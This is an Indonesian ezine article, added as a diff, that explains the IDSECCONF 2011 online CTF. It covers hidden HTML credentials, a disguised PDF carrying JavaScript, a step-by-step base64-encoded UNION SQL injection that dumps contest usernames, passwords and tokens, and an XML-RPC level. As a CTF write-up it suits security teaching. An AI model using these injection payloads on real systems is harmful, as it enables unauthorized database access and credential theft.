@@ -1,0 +1,456 @@
+              .;               .-.              
+  .-.  .-.    ;;-. .-..-.      `-' . ,';.  .-.  
+.;.-' ;      ;;  ;;   ;' ;.   ;'   ;;  ;;.;.-'  
+ `:::'`;;;;'.;`  ``;;'(   ;_.;:._.';  ;;  `:::' 
+                       `-'        ;    `.       
+ECHO MAGAZINE VOLUME IX, ISSUE XXIV, PHILE 0x07.TXT
+
+Ctf Online Idsecconf 2011 Explanation - dedi_dwianto a.k.a the_day
+dedi/dot/dwianto/at/gmail.com
+
+
+-----[ pendahuluan
+
+idecconf2011 online ctf hacking contest adalah suatu permainan hacking
+online yang dipersiapkan oleh komite idsecconf untuk kegiatan tahunan
+idsecconf, disamping kami juga mengadakan offline ctf hacking contest
+saat kegiatan.  permainan ini akan menguji tingkat keahlian hacking
+peserta di berbagai level yang telah di persiapkan oleh team ctf. pada
+tahun 2011 ini, kami akan memberikan kesempatan kepada pemenang pertama
+untuk menjadi "pemateri-khusus" pada kegiatan idsecconf2011 di
+palembang, yang berarti tiket idsecconf2011, akomodasi, transportasi
+dan penginapan akan diberikan kepada peserta yang menjadi pemenang
+pertama.
+
+ctf online ini dimulai pada 11 mei 2011 sampai  16 juni 2011; atau jika
+telah ada pemenang sebelum tanggal tersebut .  pemenang pertama dari
+ctf online ini adalah icalantehbotol yang berhak datang ke idsecconf
+2011 di palembang.  jumlah peserta yang terdaftar dan terverifikasi
+sebanyak 658
+
+pada tulisan ini saya akan coba menjelaskan mengenai tantangan yang ada
+pada ctf kali ini dan cara menyelesaikan tantangan tersebut.
+
+-----[ level tantangan :
+
+ada 5 level tantangan pada ctf online idsecconf 2011 kali ini yaitu :
+1) web hacking #1
+2) reverse engineering
+3) web hacking #2
+4) web hacking #3
+5) network analysis
+
+-----[ web hacking #1 :
+
+tantangan pada level ini mencari username&password yang akan digunakan
+untuk masuk ke level selanjutnya.  jika saya perhatikan dari log
+aplikasi banyak sekali peserta yang melakukan testing sql injection dan
+juga melakukan brute force untuk level ini. tapi sebenarnya
+username&password ada didalam halaman index sendiri .  untuk melihatnya
+cukup view source code pada browser, maka akan tampil source html dari
+halaman index ini, pada bagian header akan terdapat sesuatu kata yang
+tidak biasa, berikut snip source code dari header , aplikasi ctf online
+ini saya buat menggunakan django :
+
+------------------------------------------------
+base.html
+<!--
+/* 
+ *    ----------------------------------------------------------------
+ *    idsecconf ctf online 2011
+ *    ----------------------------------------------------------------
+ *    copyright (c) 2011 {% block acc %} {% endblock %}
+ *         dedi dwianto (dedi.dwianto[at]idsecconf[dot]org) 
+ *    ----------------------------------------------------------------
+ */
+--> 
+
+------------------------------------------------
+index.html
+----
+{% block acc %}{% if level1.status = 1 %}{{ level1.auth }} {% endif %} {% endblock %}
+----
+sehingga tampilan yang akan di lihat oleh peserta menjadi :
+
+----
+<!--
+/* 
+ *    ----------------------------------------------------------------
+ *    idsecconf ctf online 2011
+ *    ----------------------------------------------------------------
+ *    copyright (c) 2011 eyb2zawd8s
+ *         dedi dwianto (dedi.dwianto[at]idsecconf[dot]org) 
+ *    ----------------------------------------------------------------
+ */
+--> 
+----
+didapatkan username adalah eyb2zawd8s , selanjutnya mencari password
+lagi-lagi disini dibutuhkan kejelian para peserta untuk mencari hal-hal
+yang di anggap tidak biasa .
+
+password jika dilihat melalui view source code html nya terdapat pada
+bagian footer 
+
+------------------------------------------------
+index.html
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setaccount', 'ua-1144380-10']);
+  _gaq.push(['_trackpageview']);
+  var _upa = {% if level1.status = 1 %} '{{ level1.password_en }}' {% endif %};
+
+  (function() {
+----
+akan menghasilkan 
+
+----
+index.html
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setaccount', 'ua-1144380-10']);
+  _gaq.push(['_trackpageview']);
+  var _upa = %5e%28%29%2a%40%2b%21%5e%5e%28;
+
+  (function() {
+
+------------------------------------------------
+jika di lihat password %5e%28%29%2a%40%2b%21%5e%5e%28 di atas merupakan
+character yang di encode , jenis encoding nya menggunakan escape
+encoding javascript  sehingga kita bisa melakukan decode menggunakan
+unescape javascript , ada banyak converter online escape ke unescape
+salah satunya adalahi:
+http://www.web-code.org/coding-tools/javascript-escape-unescape-converter-tool.html
+
+bisa juga menggunakan library urllib nya python , saya akan coba
+menggunakan urllib python untuk melakukan decode password nya.
+
+----
+    >>> import urllib
+    >>> pass_decode = urllib.unquote('%5e%28%29%2a%40%2b%21%5e%5e%28')
+    >>> pass_decode
+    '^()*@+!^^('
+----
+jadi password untuk level1 didapatkan ^()*@+!^^( , selanjutnya masukan
+username dan password ke submit form yang ada.
+
+
+-----[  reverse engineering :
+
+level 2 ini merupakan tantangan reverse engineering yang dibuat oleh
+cyberh3b , pada level2 peserta akan mendapatkan link file yang bisa di
+download.  nama file ini random sehingga masing-masing peserta akan
+mendapatkan file yang berbeda.  contoh nama filenya adalah
+323997083009121606623602224363728631401.exe , mungkin banyak dari
+peserta yang langsung membuka file exe tersebut jika menggunakan
+windows akan error :) , jika menggunakan system *nix kita bisa
+memeriksa jenis file tersebut dengan command file .  sekarang kita coba
+mencari key pada level ini.
+
+analisa jenis file
+
+----
+$file 323997083009121606623602224363728631401.exe
+323997083009121606623602224363728631401.exe: pdf document, version 1.5
+$
+----
+jenis file ternyata pdf , jika di buka menggunakan pdf reader maka
+tampilan nya blank.  untuk melakukan analisa file pdf bisa menggunakan
+pdf parser yang bisa didownload pada
+http://blog.didierstevens.com/programs/pdf-tools/ kita mulai analisa
+file pdf tersebut menggunakan pdf parser
+
+----
+$python pdf-parser.py  323997083009121606623602224363728631401.exe
+pdf comment '%pdf-1.5\r\n'
+
+pdf comment '%\xc7\xfd\x90\xd7\r\n'
+
+obj 1 0
+ type: /catalog
+ referencing: 2 0 r, 3 0 r, 5 0 r
+ [(2, '<<'), (2, '/Ty#70e'), (2, '/C#61#74#61l#6fg'), (2,
+ '/Ou#74#6c#69n#65#73'), (1, ' '), (3, '2'), (1, ' '), (3, '0'), (1, '
+ '), (3, 'R'), (2, '/Pag#65#73'), (1, ' '), (3, '3'), (1, ' '), (3,
+ '0'), (1, ' '), (3, 'R'), (2, '/#4fp#65nAct#69o#6e'), (1, ' '), (3,
+ '5'), (1, ' '), (3, '0'), (1, ' '), (3, 'R'), (2, '>>')]
+
+ << /Type /Catalog /Outlines 2 0 R
+   /Pages 3 0 R
+   /OpenAction 5 0 R
+ >>
+
+
+obj 2 0
+ Type: /Outlines
+ Referencing: 
+ [(2, '<<'), (2, '/#54y#70#65'), (2, '/#4f#75t#6cin#65#73'), (2,
+ '/C#6f#75nt'), (1, ' '), (3, '0'), (2, '>>')]
+
+ << /Type /Outlines /Count 0
+ >>
+
+
+obj 3 0
+ Type: /Pages
+ Referencing: 4 0 R
+ [(2, '<<'), (2, '/T#79p#65'), (2, '/Pages'), (2, '/Ki#64#73'), (2,
+ '['), (3, '4'), (1, ' '), (3, '0'), (1, ' '), (3, 'R'), (2, ']'), (2,
+ '/Coun#74'), (1, ' '), (3, '1'), (2, '>>')]
+
+ << /Type /Pages /Kids [4 0 R]
+   /Count 1
+ >>
+
+
+obj 4 0
+ Type: /Page
+ Referencing: 3 0 R
+ [(2, '<<'), (2, '/#54yp#65'), (2, '/Pag#65'), (2, '/#50a#72#65#6et'),
+ (1, ' '), (3, '3'), (1, ' '), (3, '0'), (1, ' '), (3, 'R'), (2,
+ '/M#65#64#69#61B#6fx'), (2, '['), (3, '0'), (1, ' '), (3, '0'), (1, '
+ '), (3, '612'), (1, ' '), (3, '792'), (2, ']'), (2, '>>')]
+
+ << /Type /Page /Parent 3 0 R
+   /MediaBox [0 0 612 792]
+ >>
+
+
+obj 5 0
+ Type: /Action
+ Referencing: 6 0 R
+ [(2, '<<'), (2, '/T#79#70e'), (2, '/#41ct#69o#6e'), (2, '/#53'), (2,
+ '/JavaSc#72i#70#74'), (2, '/#4aS'), (1, ' '), (3, '6'), (1, ' '), (3,
+ '0'), (1, ' '), (3, 'R'), (2, '>>')]
+
+ << /Type /Action /S /JavaScript
+   /JS 6 0 R
+ >>
+
+
+obj 6 0
+ Type: 
+ Referencing: 
+ Contains stream
+ [(2, '<<'), (2, '/L#65#6eg#74#68'), (1, ' '), (3, '173'), (2,
+ '/F#69#6c#74#65r'), (2, '['), (2, '/F#6cat#65#44e#63o#64e'), (2,
+ '/#41#53#43#49#49#48exDe#63ode'), (2, ']'), (2, '>>'), (1, '\r\n')]
+
+ << /Length 173 /Filter [
+   /FlateDecode /ASCIIHexDecode]
+ >>
+
+
+xref [(3, 'xref'), (3, '0'), (3, '7'), (3, '0000000000'), (3, '65535'),
+(3, 'f'), (3, '0000000017'), (3, '00000'), (3, 'n'), (3, '0000000125'),
+(3, '00000'), (3, 'n'), (3, '0000000186'), (3, '00000'), (3, 'n'), (3,
+'0000000246'), (3, '00000'), (3, 'n'), (3, '0000000334'), (3, '00000'),
+(3, 'n'), (3, '0000000407'), (3, '00000'), (3, 'n')]
+
+trailer << /Size 7
+   /Root 10R
+ >>
+
+startxref 709
+
+PDF Comment '%%EOF\r\n'
+----
+Setiap object di-encode secara sederhana menggunakan hex encoding. Dan
+jika melihat object ke-6 (javascript),
+
+----
+$ python pdf-parser.py --object 6 323997083009121606623602224363728631401.exe 
+obj 6 0
+ Type: 
+ Referencing: 
+ Contains stream
+ [(2, '<<'), (2, '/L#65#6eg#74#68'), (1, ' '), (3, '173'), (2,
+ '/F#69#6c#74#65r'), (2, '['), (2, '/F#6cat#65#44e#63o#64e'), (2,
+ '/#41#53#43#49#49#48exDe#63ode'), (2, ']'), (2, '>>'), (1, '\r\n')]
+
+ <<
+   /Length 173
+   /Filter [
+   /FlateDecode /ASCIIHexDecode]
+ >>
+----
+Ada stream yang di compress dan stream object tersebut dapat di-decode
+dengan menggunakan FlateDecode dari zlib (salah satu standar
+compression untuk stream object pada adobe acrobat). Dengan pdf-parser
+yang telah memiliki built-in feature untuk FlateDecode, maka stream
+object tersebut dapat dibaca:
+
+----
+python pdf-parser.py --object=6 --filter 323997083009121606623602224363728631401.exe 
+obj 6 0
+ Type: 
+ Referencing: 
+ Contains stream
+ [(2, '<<'), (2, '/L#65#6eg#74#68'), (1, ' '), (3, '173'), (2,
+ '/F#69#6c#74#65r'), (2, '['), (2, '/F#6cat#65#44e#63o#64e'), (2,
+ '/#41#53#43#49#49#48exDe#63ode'), (2, ']'), (2, '>>'), (1, '\r\n')]
+
+ <<
+   /Length 173
+   /Filter [
+   /FlateDecode /ASCIIHexDecode]
+ >>
+
+ '\n  var submit_this_flag = testing123-Inv5RdDTnJ8XQZmlx1K4j4qjVPoNeU8GuWuLKEgrgD4HcCGD9WE\n  '
+----
+
+Yup pada bagian var submit_this_flag berisi key yang bisa disubmit
+untuk level2 ini keynya :
+testing123-Inv5RdDTnJ8XQZmlx1K4j4qjVPoNeU8GuWuLKEgrgD4HcCGD9WE
+
+
+-----[ Web Hacking #2 :
+
+Level 3 ini merupakan tantangan Web Hacking #2 dimana para peserta akan
+diarahkan kesebuah link yang mempunyai bug sql injection.  Link
+tersebut adalah http://mirror2.ctf.2011.idsecconf.org/level3/?view= ,
+Parameter view ini yang mempunyai bug sql injection, tetapi isi
+parameter view tersebut hasil di encode dalam base64 , paremeter ini
+sengaja dibuat encode base64 dengan tujuan bahwa para peserta tidak
+bisa menggunakan automatic sql injection tool untuk menyelesaikan
+tantangan ini, artinya harus dengan cara manual saya tidak akan
+menjelaskan secara detail proses sql injection ini,karena sudah banyak
+tutorial di sana beredar .  Tantangan disini peserta diajak untuk
+mencari user&password dari bug sql injection ini , tetapi user&password
+harus sesuai dengan token yang ada pada saat submit user&password.
+
+1)Mencari jumlah colum didapatkan 4 colum pada parameter view
+      ---
+      -6 union all select 1,2,3,4-- 
+      ---
+      di convert menjadi base64 :
+      ---
+      LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyw0LS0=
+      ---
+  sehingga linknya menjadi
+  http://mirror2.ctf.2011.idsecconf.org/level3/?view=LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyw0LS0=
+   
+2)Mencari list table
+    ---
+    -6 union all select 1,2,3,group_concat(table_name) from information_schema.tables--
+    --
+    base64
+    ---
+    LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzLS0=
+    ---
+    link: 
+    http://mirror2.ctf.2011.idsecconf.org/level3/?view=LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzLS0=
+    ---
+    result:
+    ---CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,KEY_COLUMN_USAGE,PROFILING,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,auth_group,auth_group_permissions,auth_message,auth_permission,auth_user,auth_user_groups,auth_user_user_permissions,django_content_type,django_session,django_site,level3_l3,level3_l3_1,level3_l3_10,level3_l3_2,level3_l3_3,level3_l3_4,level3_l3_5,level3_l3_6,level3_l3_7,level3_l3_8,level3_l3_9
+
+3)Setelah mendapatkan list table, peserta harus mencari table yang
+  berisi username&password dan sesuai dengan token yang ada , disini
+  table tersebut bernama level3_l3_6
+
+    ---
+    -6 union all select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='level3_l3_6'--
+    ---
+    base64
+    LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0nbGV2ZWwzX2wzXzYnLS0=    ---
+    link:
+    http://mirror2.ctf.2011.idsecconf.org/level3/?view=LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0nbGV2ZWwzX2wzXzYnLS0=
+    ---
+    result :
+    id,username,token,password
+    ---
+    -6 union all select 1,2,3,group_concat( id,0x3a,username,0x3a,password,0x3a,token) from level3_l3_6--
+    ---
+    base64 :
+    LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyxncm91cF9jb25jYXQoIGlkLDB4M2EsdXNlcm5hbWUsMHgzYSxwYXNzd29yZCwweDNhLHRva2VuKSBmcm9tIGxldmVsM19sM182LS0=
+    ---
+    link :
+    http://mirror2.ctf.2011.idsecconf.org/level3/?view=LTYgdW5pb24gYWxsIHNlbGVjdCAxLDIsMyxncm91cF9jb25jYXQoIGlkLDB4M2EsdXNlcm5hbWUsMHgzYSxwYXNzd29yZCwweDNhLHRva2VuKSBmcm9tIGxldmVsM19sM182LS0=
+    ---
+    result :
+    IDSECCONF 2010 - Papers
+    irFCjygk2R:25235F2A292A2B212829:24cfedbdd4d7447b3a2195239b854235,
+    6g2LNhBGZf:5F235E2825402125252B:aec808eb6970d2544a91c7b008870420,
+    HwLWSNVYDs:28212B28407E5F5F7E21:bb1504410da8a0f6544900ab4b775d49,
+    Y7L1dIoqwf:26242A26402A282B2540:7ec996efe8702259216a3f1a553a94d1,
+    jRsNvAF7pm:23282123285E2A212A28:dc6921721e8bd1c72b65c13f113a2228,
+    cy7UVcysm1:265E28402340402A5E25:7eb9e27b854c7ab05537e32a76c7331d,
+    TWTa1DTfPb:29292325402B407E5E40:b06a4e289edcf5165eb3f79cbad31027,
+    q8DpdBNpi9:265F2124282826265E5E:22673c8671ff373d0406c8f2d71eae4f,
+    1fSImYvOYy:402A7E26402821282A25:9a3662ef7509dc56d4c8ff1f496242cd,
+    K13M1wviXd:405E2B2426295E232B5E:b6f390f03b6139fd0b73c08e3f9d068a,
+    M92oSRnheH:5F242A292923295E4021:da3e226e0bf1a33acb96e538975cca1a,
+    A0mGjsw9pK:7E7E5E2326212824252A:8c41a6b3bc26668429004b31c188d1ca,
+    tedHsDbtBf:29232626252921262621:b654aed3918163d2b080fac6916cde4e,
+    3pgn7dTwfz:2B2440255F5E21282528:958d2deb8efe902c879a5ef5dc684472,
+    tM09VGLzOB:21294025262628212B26:285a8a2f9de5cdf2a581b01bae7e2c2f,
+    mjRgdOLKJp:292429245E28232B217E:7fa911d77e5d3fd42
+    
+Didapatkan list username,password dan token yang bisa dimasukan untuk
+menuju level4
+
+
+-----[ Web Hacking #3 :
+
+Pada level ini juga merupakan web hacking , tetapi untuk mengakses dan
+submit url http://ctf.2011.idsecconf.org/level4/tokenkey harus
+menggunakan script atau tool tertentu,karena level4 ini menggunakan
+protocol xml rpc protocol , sehingga jika menggunakan protocol http
+biasa tidak akan bisa mengakses dan melakukan submit.    Jika membuka
+link tersebut menggunakan browser maka akan muncul : contoh link
+
+http://ctf.2011.idsecconf.org/level4/b879c632b62edad02629330830002726
+
+    ---
+    <idsecconf>
+    <!-- Code Created by : dedi.dwianto[at]idsecconf[dot]org  -->
+    <!-- Web Service Hacking -->
+        <level4>
+            <auth><!-- Authentication Function -->
+                <username text="Your Login Username"/>
+                <password text="Your Login Password"/>
+                <token token="b879c632b62edad02629330830002726"/>
+            </auth>
+            <submitflag><!-- Submit Flag Function -->
+                <token token="Token Flag Here"/>
+                <key key="Your Key Here"/>
+            </submitflag>
+        </level4>
+    </idsecconf>
+
+    ---
+Diatas terlihat beberapa method yang diizinkan pada xml rpc server
+pertama auth dan submitflag , Saya akan menggunakan xmllib dari python
+untuk melakukan komunikasi xmlrpc , pertama melakukan authentikasi
+dengan field username,password dan token .  username&password sama
+seperti username&password untuk login ke ctf.2011.idsecconf.org
+
+    ---
+    >>> import sys
+    >>> import xmlrpclib
+    >>> srv = xmlrpclib.ServerProxy("http://ctf.2011.idsecconf.org/level4/b879c632b62edad02629330830002726")
+    >>> auth = srv.auth("testing123","xxxxx","b879c632b62edad02629330830002726")
+    >>> auth
+    The Key : bc865f45bdad0048e8313af2b1ccfbd0 Crack it & Submit
+
+    ---
+Yup didapatkan keynya tetapi harus di crack key tersebut
+bc865f45bdad0048e8313af2b1ccfbd0 , setelah dilakukan cracking
+didapatkan key nya adalah aO0nd Selanjutnya melakukan submit key
+tersebut melalui method submitflag 
+
+    ---
+    >>> import sys
+    >>> import xmlrpclib
+    >>> srv = xmlrpclib.ServerProxy("http://ctf.2011.idsecconf.org/level4/b879c632b62edad02629330830002726")
+    >>> submit = srv.submitflag("b879c632b62edad02629330830002726","aO0nd")
+    >>> submit
+    Conglaturation You have successfully Pass This Level
+    ---
+
+  
+-----[ Thanks
+    [+] Alls
